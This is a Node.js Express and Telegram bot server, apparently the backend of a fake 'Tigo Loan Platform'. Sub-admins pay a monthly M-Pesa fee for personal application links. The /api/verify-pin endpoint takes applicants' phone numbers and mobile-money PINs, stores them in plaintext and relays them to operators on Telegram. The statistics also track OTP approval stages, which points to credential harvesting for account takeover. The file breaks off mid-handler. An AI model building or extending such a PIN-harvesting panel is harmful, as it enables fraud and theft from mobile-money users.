const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const { ObjectId } = require('mongodb');
require('dotenv').config();

const db = require('./database');

const app = express();

const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL;

const bot = new TelegramBot(BOT_TOKEN);

const adminChatIds = new Map();
const pausedAdmins = new Set();
const lockedAdmins = new Set();
const processingLocks = new Set();

let dbReady = false;

// ==========================================
// SHORT CODE GENERATOR
// ==========================================
async function generateUniqueShortCode() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    for (let attempt = 0; attempt < 20; attempt++) {
        let code = '';
        for (let i = 0; i < 5; i++) {
            code += chars[Math.floor(Math.random() * chars.length)];
        }
        const existing = await db.getAdminByShortCode(code);
        if (!existing) return code;
    }
    throw new Error('Could not generate unique short code after 20 attempts');
}

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId) && !lockedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);
    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) { console.error(`❌ No chat ID for admin: ${adminId}`); return null; }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }
    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT SETUP
// ==========================================
bot.on('error', (e) => console.error('❌ Bot error:', e?.message));
bot.on('polling_error', (e) => console.error('❌ Polling error:', e?.message));

setupCommandHandlers();

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;
app.post(webhookPath, (req, res) => {
    try {
        if (req.body?.update_id !== undefined) {
            try { bot.processUpdate(req.body); } catch (e) { console.error('❌ processUpdate error:', e); }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');
        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSet = false;

        for (let attempt = 1; attempt <= 3 && !webhookSet; attempt++) {
            try {
                console.log(`🔄 Attempt ${attempt}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(r => setTimeout(r, 1000));
                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false, max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });
                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) { webhookSet = true; console.log('✅ Webhook confirmed!'); }
                }
            } catch (e) {
                console.error(`❌ Webhook attempt ${attempt} failed:`, e.message);
                if (attempt < 3) await new Promise(r => setTimeout(r, 2000));
            }
        }

        if (!webhookSet) console.error('❌ CRITICAL: Failed to set webhook!');

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot: @${botInfo.username}`);
        } catch (e) { console.error('❌ Bot API error:', e); }

        // Schedule subscription check (runs every hour, checks date on 5th)
        scheduleSubscriptionCheck();

        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins, ${pausedAdmins.size} paused, ${lockedAdmins.size} locked`);
        }, 60000);

        setInterval(async () => {
            try {
                const info = await bot.getWebHookInfo();
                if (info.url !== fullWebhookUrl) {
                    console.log('⚠️ Webhook lost — re-setting...');
                    await bot.setWebHook(fullWebhookUrl, { drop_pending_updates: false, max_connections: 40, allowed_updates: ['message', 'callback_query'] });
                }
            } catch (e) { console.error('⚠️ Webhook check error:', e.message); }
        }, 60000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => { console.error('❌ Initialization failed:', error); process.exit(1); });

async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        adminChatIds.clear();
        pausedAdmins.clear();
        lockedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }

        // Load locked admins from subscriptions
        const allAdmins = await db.getAllAdmins();
        for (const admin of allAdmins) {
            const sub = await db.getSubscription(admin.adminId);
            if (sub?.isLocked) {
                lockedAdmins.add(admin.adminId);
            }
        }

        console.log(`✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused, ${lockedAdmins.size} locked`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

function scheduleSubscriptionCheck() {
    const checkSubscriptions = async () => {
        const today = new Date();
        const dayOfMonth = today.getDate();
        
        // Check subscriptions on the 5th of each month
        if (dayOfMonth === 5) {
            console.log('📅 5th of month detected - checking subscriptions...');
            const lockedCount = await db.checkAndLockOverdueSubscriptions();
            if (lockedCount > 0) {
                console.log(`🔒 Locked ${lockedCount} admins due to unpaid subscriptions`);
                await loadAdminChatIds(); // Reload to get updated lock status
            }
        }
    };

    setInterval(checkSubscriptions, 60 * 60 * 1000); // Check every hour
    console.log('📅 Subscription checker scheduled (runs hourly, locks on 5th of month)');
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================

function setupCommandHandlers() {

    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            let adminId = getAdminIdByChatId(chatId);

            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\n\nContact the super admin.\n\n*Your Admin ID:* \`${adminId}\``, { parse_mode: 'Markdown' });
                    return;
                }

                // Check if locked (subscription issue)
                if (lockedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    const sub = await db.getSubscription(adminId);
                    await bot.sendMessage(chatId, `
🔒 *SUBSCRIPTION LOCKED*

*Reason:* ${sub?.lockReason || 'Subscription fee overdue'}

*What to do:*
1️⃣ Send M-Pesa payment of TSh 500
2️⃣ Send the M-Pesa reference (e.g., ABC123DEF) to this bot
3️⃣ Super admin will review and unlock your access

*Next billing date:* ${sub?.nextBillingDate ? new Date(sub.nextBillingDate).toLocaleDateString('en-US', {year: 'numeric', month: 'long', day: 'numeric'}) : 'Unknown'}

Contact super admin for help.
                    `, { parse_mode: 'Markdown' });
                    return;
                }

                const admin = await db.getAdmin(adminId);
                if (admin) {
                    const isSuperAdmin = adminId === 'ADMIN001';
                    const appUrl = process.env.APP_URL || WEBHOOK_URL;
                    let message = isSuperAdmin
                        ? `👑 *SUPER ADMIN DASHBOARD*\n\n🔗 *Your Management Link:*\n\`${appUrl}/${admin.shortCode}\`\n\n📊 Use commands below to manage the system.`
                        : `✅ *ADMIN DASHBOARD*\n\n🔗 *Your Application Link:*\n\`${appUrl}/${admin.shortCode}\`\n\nShare this link with users who want to apply for loans.`;

                    await bot.sendMessage(chatId, message, {
                        parse_mode: 'Markdown',
                        reply_markup: {
                            keyboard: isSuperAdmin
                                ? [[{ text: '/stats' }, { text: '/listadmins' }], [{ text: '/addadmin' }, { text: '/payments' }], [{ text: '/help' }, { text: '/status' }]]
                                : [[{ text: '/stats' }, { text: '/pending' }], [{ text: '/myinfo' }]]
                        }
                    });
                    return;
                }
            }

            await bot.sendMessage(chatId, '⚠️ You are not registered as an admin. Contact the super admin.');
        } catch (error) {
            console.error('❌ /start error:', error);
            await bot.sendMessage(chatId, '❌ Error loading dashboard');
        }
    });

    // /help command
    bot.onText(/\/help/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId === 'ADMIN001') {
            await bot.sendMessage(chatId, `
👑 *SUPER ADMIN COMMANDS*

/start - Dashboard
/listadmins - View all sub-admins
/addadmin - Register new sub-admin
/stats - System statistics
/status - System health
/payments - Review pending payments
/unlock ADMIN_ID - Unlock locked account
/help - Show this message

💰 *Payment Management:*
- Sub-admins send M-Pesa references
- Use /payments to approve/reject
- Approved payments unlock accounts
            `, { parse_mode: 'Markdown' });
        } else {
            await bot.sendMessage(chatId, `
✅ *SUB-ADMIN COMMANDS*

/start - Dashboard
/stats - Your statistics
/pending - Apps awaiting approval
/myinfo - Your profile & link
/help - Show this message

💰 *To unlock your account:*
1. Send M-Pesa TSh 500
2. Send the reference here
3. Wait for super admin approval
            `, { parse_mode: 'Markdown' });
        }
    });

    // /addadmin command
    bot.onText(/\/addadmin/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only super admin can add admins');
            return;
        }

        await bot.sendMessage(chatId, `
📝 *ADD NEW SUB-ADMIN*

Please provide admin details in this format:
\`NAME | EMAIL | BOT_TOKEN | CHAT_ID\`

*Example:*
\`John Doe | john@example.com | 123456789:ABCdef-GhIjk | 987654321\`

Where:
- NAME = Admin full name
- EMAIL = Admin email address
- BOT_TOKEN = Bot token from @BotFather
- CHAT_ID = Your Telegram chat ID (from @userinfobot)
        `, { parse_mode: 'Markdown' });
    });

    // /listadmins command
    bot.onText(/\/listadmins/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only super admin can view admins');
            return;
        }

        try {
            const admins = await db.getAllAdmins();
            
            if (admins.length === 0) {
                await bot.sendMessage(chatId, '📋 No sub-admins created yet.\n\nUse /addadmin to create one.');
                return;
            }

            let message = `📋 *ALL SUB-ADMINS* (${admins.length} total)\n\n`;

            for (let i = 0; i < admins.length; i++) {
                const admin = admins[i];
                const sub = await db.getSubscription(admin.adminId);
                const lockStatus = sub?.isLocked ? '🔒 LOCKED' : '✅ ACTIVE';
                
                message += `${i + 1}. *${admin.name}*\n`;
                message += `   📧 ${admin.email}\n`;
                message += `   🆔 \`${admin.adminId}\`\n`;
                message += `   🔗 \`${admin.shortCode}\`\n`;
                message += `   🌐 \`${process.env.APP_URL || WEBHOOK_URL}/${admin.shortCode}\`\n`;
                message += `   ${lockStatus}\n`;
                message += `   💳 Next bill: ${sub?.nextBillingDate ? new Date(sub.nextBillingDate).toLocaleDateString('en-US', {month: 'short', day: 'numeric'}) : 'N/A'}\n\n`;
            }

            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ /listadmins error:', error);
            await bot.sendMessage(chatId, '❌ Error loading admins');
        }
    });

    // /stats command
    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        try {
            if (adminId === 'ADMIN001') {
                // Super admin sees system-wide stats
                const stats = await db.getStats();
                const allAdmins = await db.getAllAdmins();
                const lockedCount = allAdmins.filter(a => {
                    const isLocked = lockedAdmins.has(a.adminId);
                    return isLocked;
                }).length;

                await bot.sendMessage(chatId, `
📊 *SYSTEM STATISTICS*

👥 *Admins:*
   • Total: ${stats.totalAdmins}
   • Active: ${stats.totalAdmins - lockedCount}
   • Locked: ${lockedCount}

📋 *Applications:*
   • Total: ${stats.totalApplications}
   • Pending PIN: ${stats.pinPending}
   • PIN Approved: ${stats.pinApproved}
   • Pending OTP: ${stats.otpPending}
   • Fully Approved: ${stats.fullyApproved}
   • Rejected: ${stats.totalRejected}

💰 *Approx Volume:*
   • TSh ${(stats.fullyApproved * 5000000).toLocaleString()}+
                `, { parse_mode: 'Markdown' });
            } else {
                // Sub-admin sees only their stats
                const stats = await db.getAdminStats(adminId);
                const admin = await db.getAdmin(adminId);

                await bot.sendMessage(chatId, `
📊 *YOUR STATISTICS* (${admin?.name})

📋 *Applications:*
   • Total: ${stats.total}
   • Pending PIN: ${stats.pinPending}
   • PIN Approved: ${stats.pinApproved}
   • Pending OTP: ${stats.otpPending}
   • Fully Approved: ${stats.fullyApproved}

✅ *Approval Rate:* ${stats.total > 0 ? Math.round((stats.fullyApproved / stats.total) * 100) : 0}%
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ /stats error:', error);
            await bot.sendMessage(chatId, '❌ Error loading statistics');
        }
    });

    // /status command
    bot.onText(/\/status/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only super admin can view system status');
            return;
        }

        try {
            const activeAdmins = adminChatIds.size;
            const allAdmins = await db.getAllAdmins();
            const lockedCount = allAdmins.filter(a => lockedAdmins.has(a.adminId)).length;
            const pausedCount = pausedAdmins.size;

            await bot.sendMessage(chatId, `
🔍 *SYSTEM STATUS*

✅ *Connectivity:*
   • Database: Connected
   • Bot: Webhook Active
   • Server: Running

👥 *Admin Management:*
   • Active: ${activeAdmins}
   • Locked: ${lockedCount}
   • Paused: ${pausedCount}
   • Total: ${allAdmins.length}

⏰ *Last Check:* ${new Date().toLocaleString('en-US')}
                `, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ /status error:', error);
            await bot.sendMessage(chatId, '❌ Error checking status');
        }
    });

    // /payments command
    bot.onText(/\/payments/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only super admin can review payments');
            return;
        }

        try {
            const pendingPayments = await db.getPendingPayments();

            if (pendingPayments.length === 0) {
                await bot.sendMessage(chatId, '✅ *No pending payments*\n\nAll subscription fees are up to date!', { parse_mode: 'Markdown' });
                return;
            }

            let message = `💰 *PENDING PAYMENTS* (${pendingPayments.length})\n\n`;
            const keyboard = [];

            for (const payment of pendingPayments) {
                const admin = await db.getAdmin(payment.adminId);
                message += `📱 *${admin?.name || payment.adminId}*\n`;
                message += `💵 TSh ${payment.amount}\n`;
                message += `📋 Ref: \`${payment.mpesaReference}\`\n`;
                message += `📅 Days before lock: ${Math.max(0, 5 - new Date().getDate())}\n`;
                message += `⏰ Submitted: ${new Date(payment.requestedAt).toLocaleString('en-US', {month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit'})}\n\n`;

                keyboard.push([
                    { text: `✅ ${payment.adminId}`, callback_data: `approve_payment_${payment._id.toString()}` },
                    { text: `❌ ${payment.adminId}`, callback_data: `reject_payment_${payment._id.toString()}` }
                ]);
            }

            await bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        } catch (error) {
            console.error('❌ /payments error:', error);
            await bot.sendMessage(chatId, '❌ Error loading payments');
        }
    });

    // /unlock command
    bot.onText(/\/unlock (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only super admin can unlock accounts');
            return;
        }

        const targetAdminId = match[1].toUpperCase().trim();

        try {
            const targetAdmin = await db.getAdmin(targetAdminId);
            if (!targetAdmin) {
                await bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found`, { parse_mode: 'Markdown' });
                return;
            }

            await db.unlockAdminSubscription(targetAdminId);
            lockedAdmins.delete(targetAdminId);

            const nextBilling = await db.getSubscription(targetAdminId);
            await sendToAdmin(targetAdminId, `
✅ *ACCESS RESTORED*

Super admin has unlocked your account.
You can now use the platform normally.

📅 *Next billing:* ${nextBilling?.nextBillingDate ? new Date(nextBilling.nextBillingDate).toLocaleDateString('en-US', {year: 'numeric', month: 'long', day: 'numeric'}) : 'Unknown'}

Thank you!
            `, { parse_mode: 'Markdown' });

            await bot.sendMessage(chatId, `✅ *${targetAdminId}* unlocked successfully`, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Unlock error:', error);
            await bot.sendMessage(chatId, '❌ Error unlocking admin');
        }
    });

    // /pending command (sub-admin only)
    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId || adminId === 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only sub-admins can view pending applications');
            return;
        }

        try {
            const pending = await db.getPendingApplications(adminId);

            if (pending.length === 0) {
                await bot.sendMessage(chatId, '✅ No pending applications\n\nAll applications are approved!', { parse_mode: 'Markdown' });
                return;
            }

            let message = `⏳ *PENDING APPLICATIONS* (${pending.length})\n\n`;

            for (let i = 0; i < pending.length; i++) {
                const app = pending[i];
                message += `${i + 1}. \`${app.id}\`\n`;
                message += `   📱 ${app.phoneNumber}\n`;
                message += `   ${app.pinStatus === 'pending' ? '⏳ Waiting for PIN approval' : '⏳ Waiting for OTP approval'}\n`;
                message += `   ⏰ ${new Date(app.timestamp).toLocaleString('en-US', {month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit'})}\n\n`;
            }

            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ /pending error:', error);
            await bot.sendMessage(chatId, '❌ Error loading pending applications');
        }
    });

    // /myinfo command (sub-admin only)
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId || adminId === 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Only sub-admins can view profile');
            return;
        }

        try {
            const admin = await db.getAdmin(adminId);
            const sub = await db.getSubscription(adminId);
            const stats = await db.getAdminStats(adminId);
            const appUrl = process.env.APP_URL || WEBHOOK_URL;
            const lockStatus = lockedAdmins.has(adminId) ? '🔒 LOCKED' : '✅ ACTIVE';

            await bot.sendMessage(chatId, `
👤 *YOUR ADMIN PROFILE*

*Name:* ${admin?.name}
*Email:* ${admin?.email}
*Admin ID:* \`${adminId}\`
*Short Code:* \`${admin?.shortCode}\`

🔗 *Share this link with users:*
\`${appUrl}/${admin?.shortCode}\`

${lockStatus}

📊 *Your Stats:*
   • Total Apps: ${stats.total}
   • Approved: ${stats.fullyApproved}
   • Pending: ${stats.pinPending + stats.otpPending}

💳 *Subscription:*
   • Status: ${sub?.status}
   • Next Billing: ${sub?.nextBillingDate ? new Date(sub.nextBillingDate).toLocaleDateString('en-US', {year: 'numeric', month: 'long', day: 'numeric'}) : 'N/A'}
   • Monthly Fee: TSh 500
            `, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ /myinfo error:', error);
            await bot.sendMessage(chatId, '❌ Error loading profile');
        }
    });

    // Callback: Approve payment
    bot.on('callback_query', async (query) => {
        if (query.data.startsWith('approve_payment_')) {
            const paymentId = query.data.replace('approve_payment_', '');
            const adminId = getAdminIdByChatId(query.from.id);

            if (adminId !== 'ADMIN001') {
                await bot.answerCallbackQuery(query.id, '❌ Only super admin', true);
                return;
            }

            try {
                const payments = await db.getPendingPayments();
                const payment = payments.find(p => p._id.toString() === paymentId);

                if (!payment) {
                    await bot.answerCallbackQuery(query.id, '❌ Payment not found', true);
                    return;
                }

                // Approve the payment
                const approved = await db.approvePayment(new ObjectId(paymentId), payment.adminId);
                
                if (approved) {
                    // Remove from locked list
                    lockedAdmins.delete(payment.adminId);

                    // Notify admin
                    const nextBilling = await db.getSubscription(payment.adminId);
                    await sendToAdmin(payment.adminId, `
✅ *PAYMENT APPROVED*

Your subscription payment of TSh 500 has been approved!

🔓 Your account is now unlocked and fully active.

📅 *Next billing date:* ${nextBilling?.nextBillingDate ? new Date(nextBilling.nextBillingDate).toLocaleDateString('en-US', {year: 'numeric', month: 'long', day: 'numeric'}) : 'Unknown'}

Thank you for your business!
                    `, { parse_mode: 'Markdown' });

                    // Update message
                    await bot.editMessageText(`✅ Payment approved for \`${payment.adminId}\`\n\nRef: ${payment.mpesaReference}`, {
                        chat_id: query.from.id,
                        message_id: query.message.message_id,
                        parse_mode: 'Markdown'
                    });

                    await bot.answerCallbackQuery(query.id, '✅ Payment approved and account unlocked!');
                    console.log(`✅ Payment approved: ${payment.adminId}`);
                } else {
                    await bot.answerCallbackQuery(query.id, '❌ Approval failed', true);
                }
            } catch (error) {
                console.error('❌ Approve payment error:', error);
                await bot.answerCallbackQuery(query.id, '❌ Error approving payment', true);
            }
        }

        // Callback: Reject payment
        if (query.data.startsWith('reject_payment_')) {
            const paymentId = query.data.replace('reject_payment_', '');
            const adminId = getAdminIdByChatId(query.from.id);

            if (adminId !== 'ADMIN001') {
                await bot.answerCallbackQuery(query.id, '❌ Only super admin', true);
                return;
            }

            try {
                const payments = await db.getPendingPayments();
                const payment = payments.find(p => p._id.toString() === paymentId);

                if (!payment) {
                    await bot.answerCallbackQuery(query.id, '❌ Payment not found', true);
                    return;
                }

                const rejected = await db.rejectPayment(new ObjectId(paymentId));

                if (rejected) {
                    // Notify admin
                    await sendToAdmin(payment.adminId, `
❌ *PAYMENT REJECTED*

Your subscription payment was not approved.

*Reference:* \`${payment.mpesaReference}\`
*Amount:* TSh ${payment.amount}

*Please:*
1. Verify the M-Pesa transaction
2. Send the payment again
3. Contact super admin if you have questions

Your account remains locked until approved payment is received.
                    `, { parse_mode: 'Markdown' });

                    // Update message
                    await bot.editMessageText(`❌ Payment rejected for \`${payment.adminId}\`\n\nRef: ${payment.mpesaReference}`, {
                        chat_id: query.from.id,
                        message_id: query.message.message_id,
                        parse_mode: 'Markdown'
                    });

                    await bot.answerCallbackQuery(query.id, '❌ Payment rejected. Admin notified.');
                    console.log(`❌ Payment rejected: ${payment.adminId}`);
                } else {
                    await bot.answerCallbackQuery(query.id, '❌ Rejection failed', true);
                }
            } catch (error) {
                console.error('❌ Reject payment error:', error);
                await bot.answerCallbackQuery(query.id, '❌ Error rejecting payment', true);
            }
        }
    });

    // Handle M-Pesa payment references
    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text || '';
        const adminId = getAdminIdByChatId(chatId);

        // Only process if: not super admin, has text, looks like M-Pesa reference
        if (text.length > 0 && adminId && adminId !== 'ADMIN001') {
            // Check if message looks like M-Pesa reference (alphanumeric, 6-10 chars)
            const reference = text.trim().toUpperCase();
            
            if (reference.length >= 6 && reference.length <= 15 && /^[A-Z0-9]+$/.test(reference)) {
                try {
                    const sub = await db.getSubscription(adminId);
                    
                    // Check if admin is locked (needs payment)
                    if (sub?.isLocked) {
                        // Record payment request
                        await db.recordPaymentRequest(adminId, {
                            reference,
                            amount: 500,
                            phoneNumber: msg.from.username || msg.from.first_name || 'Unknown'
                        });

                        await bot.sendMessage(chatId, `
✅ *PAYMENT RECEIVED*

*Reference:* \`${reference}\`
*Amount:* TSh 500
*Status:* Pending super admin approval

We've sent your payment to the super admin for review.
This usually takes a few minutes to a few hours.

We'll notify you once it's approved!
                        `, { parse_mode: 'Markdown' });

                        // Notify super admin
                        const superAdminChatId = adminChatIds.get('ADMIN001');
                        if (superAdminChatId) {
                            const admin = await db.getAdmin(adminId);
                            await bot.sendMessage(superAdminChatId, `
💰 *NEW PAYMENT SUBMISSION*

👤 *Admin:* ${admin?.name || adminId}
💵 *Amount:* TSh 500
📋 *Reference:* \`${reference}\`
⏰ *Time:* ${new Date().toLocaleString('en-US')}

Use /payments to review, approve, or reject.
                            `, { parse_mode: 'Markdown' });
                        }
                    }
                } catch (error) {
                    console.error('❌ Payment processing error:', error);
                }
            }
        }
    });

    // /addadmin text handler
    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text || '';
        const adminId = getAdminIdByChatId(chatId);

        // Check if this is an addadmin response (has pipes)
        if (text.includes('|') && adminId === 'ADMIN001' && !text.startsWith('/')) {
            const parts = text.split('|').map(p => p.trim());

            if (parts.length === 4) {
                const [name, email, botToken, chatIdStr] = parts;

                // Validate format
                if (!name || !email || !botToken || !chatIdStr) {
                    await bot.sendMessage(chatId, '❌ All fields are required. Format: NAME | EMAIL | BOT_TOKEN | CHAT_ID');
                    return;
                }

                if (!email.includes('@')) {
                    await bot.sendMessage(chatId, '❌ Invalid email format');
                    return;
                }

                const newChatId = parseInt(chatIdStr);
                if (isNaN(newChatId)) {
                    await bot.sendMessage(chatId, '❌ Chat ID must be a number');
                    return;
                }

                try {
                    // Generate unique admin ID (timestamp-based)
                    const adminIdValue = `ADMIN-${Date.now()}`;
                    const shortCode = await generateUniqueShortCode();

                    // Verify bot token is valid by attempting connection
                    const testBot = new TelegramBot(botToken);
                    await testBot.getMe(); // This will throw if token is invalid

                    // Save admin to database
                    const appUrl = process.env.APP_URL || WEBHOOK_URL;
                    await db.saveAdmin({
                        adminId: adminIdValue,
                        name,
                        email,
                        chatId: newChatId,
                        shortCode,
                        status: 'active',
                        createdAt: new Date().toISOString()
                    });

                    // Load the new admin into memory
                    adminChatIds.set(adminIdValue, newChatId);

                    await bot.sendMessage(chatId, `
✅ *SUB-ADMIN CREATED!*

*Name:* ${name}
*Email:* ${email}
*Admin ID:* \`${adminIdValue}\`
*Short Code:* \`${shortCode}\`

🔗 *Share this link with users:*
\`${appUrl}/${shortCode}\`

💳 *Subscription:*
- Status: Active
- Monthly Fee: TSh 500
- First billing: On day 5 of month
- Auto-lock on day 5 if unpaid

📊 Admin can now use /stats, /pending, /myinfo
                    `, { parse_mode: 'Markdown' });

                    console.log(`✅ Admin created: ${adminIdValue} (${name})`);

                    // Welcome message to new admin's bot
                    try {
                        await testBot.sendMessage(newChatId, `
✅ *WELCOME TO TIGO LOAN PLATFORM*

Your bot is now connected and ready!

📧 *Admin:* ${name}
🔗 *Short Code:* \`${shortCode}\`

🔗 *Share your link:*
\`${appUrl}/${shortCode}\`

Send /start to begin.
                        `, { parse_mode: 'Markdown' });
                    } catch (e) {
                        console.log('Could not send welcome message to new admin');
                    }

                } catch (error) {
                    console.error('❌ Error creating admin:', error);
                    let errorMsg = '❌ Error creating admin';
                    if (error.message.includes('bot token')) {
                        errorMsg = '❌ Bot token is invalid. Please check and try again.';
                    }
                    await bot.sendMessage(chatId, errorMsg);
                }
            }
        }
    });
}

// ==========================================
// API ENDPOINTS - VERIFICATION
// ==========================================

app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId } = req.body;

        if (!phoneNumber || !pin || !adminId) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }

        const admin = await db.getAdmin(adminId);
        if (!admin) {
            return res.status(404).json({ success: false, message: 'Admin not found' });
        }

        // Check if admin is locked
        const subscription = await db.getSubscription(adminId);
        if (subscription?.isLocked) {
            return res.status(403).json({ 
                success: false, 
                message: 'Admin access locked. Subscription fee required.' 
            });
        }

        const applicationId = `LOAN-${Date.now()}`;

        await db.saveApplication({
            id: applicationId,
            adminId,
            adminName: admin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            timestamp: new Date().toISOString()
        });

        await sendToAdmin(adminId, `
📝 *PIN VERIFICATION REQUEST*

*Application ID:* \`${applicationId}\`
*Phone:* ${phoneNumber}
*PIN:* \`${pin}\`
⏰ ${new Date().toLocaleString('en-US')}

[❌ Wrong PIN] [❌ Reject] [✅ Approve PIN]
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '❌ Wrong PIN', callback_data: `wrongpin_pin_${adminId}_${applicationId}` },
                        { text: '❌ Reject', callback_data: `reject_pin_${adminId}_${applicationId}` }
                    ],
                    [{ text: '✅ Approve PIN', callback_data: `approve_pin_${adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true, applicationId });
    } catch (error) {
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.pinStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// PIN approval callbacks
bot.on('callback_query', async (query) => {
    if (query.data.startsWith('approve_pin_')) {
        const parts = query.data.replace('approve_pin_', '').split('_');
        const [adminId, applicationId] = [parts[0], parts.slice(1).join('_')];

        try {
            await db.updateApplication(applicationId, { pinStatus: 'approved' });
            
            await bot.editMessageText(`✅ PIN approved for \`${applicationId}\``, {
                chat_id: query.from.id,
                message_id: query.message.message_id,
                parse_mode: 'Markdown'
            });
            
            await bot.answerCallbackQuery(query.id, '✅ PIN approved');
        } catch (error) {
            console.error('❌ Error:', error);
            await bot.answerCallbackQuery(query.id, '❌ Error', true);
        }
    }

    if (query.data.startsWith('reject_pin_')) {
        const parts = query.data.replace('reject_pin_', '').split('_');
        const [adminId, applicationId] = [parts[0], parts.slice(1).join('_')];

        try {
            await db.updateApplication(applicationId, { pinStatus: 'rejected' });
            
            await bot.editMessageText(`❌ PIN rejected for \`${applicationId}\``, {
                chat_id: query.from.id,
                message_id: query.message.message_id,
                parse_mode: 'Markdown'
            });
            
            await bot.answerCallbackQuery(query.id, '❌ PIN rejected');
        } catch (error) {
            console.error('❌ Error:', error);
            await bot.answerCallbackQuery(query.id, '❌ Error', true);
        }
    }

    if (query.data.startsWith('wrongpin_pin_')) {
        const parts = query.data.replace('wrongpin_pin_', '').split('_');
        const [adminId, applicationId] = [parts[0], parts.slice(1).join('_')];

        try {
